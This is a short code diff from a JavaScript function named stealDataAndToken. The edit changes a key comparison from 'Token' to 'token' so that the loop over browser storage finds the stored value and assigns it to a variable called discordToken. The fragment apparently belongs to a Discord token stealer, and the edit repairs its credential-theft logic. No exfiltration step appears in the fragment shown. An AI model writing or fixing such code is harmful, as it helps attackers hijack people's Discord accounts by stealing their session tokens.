@@ -12,8 +12,8 @@ function stealDataAndToken() {
 
         // Iterate over the keys in the storage
         for (var key in storageData) {
-            if (key === 'Token') {
-                // Found the key named "Token", retrieve the value
+            if (key === 'token') { // Changed 'Token' to 'token' for case sensitivity
+                // Found the key named "token", retrieve the value
                 discordToken = storageData[key];
                 break; // Stop iterating once the token is found
             }
